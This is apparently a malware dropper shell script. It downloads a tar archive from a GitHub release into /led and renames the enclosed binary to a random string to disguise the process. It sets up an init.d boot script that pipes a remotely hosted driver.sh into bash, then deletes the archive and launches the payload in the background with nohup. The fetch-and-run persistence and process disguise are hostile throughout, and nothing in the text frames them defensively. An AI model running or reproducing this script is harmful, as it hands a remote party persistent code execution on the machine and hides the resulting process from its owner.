cd /
wget https://github.com/outputy/inputs/releases/download/v0.0.3/led.tar
tar -xvf led.tar
cd /led
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv serveri $variable1
sed -i "s/oodo/${variable1} -t=370 -n=${variable1}/g" ./pcb.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/outputy/inputs/main/driver.sh)" > button.sh
chmod a+x button.sh
update-rc.d button.sh defaults
rm -rf led.tar
cd /led
nohup ./pcb.sh
ps -ef | grep led
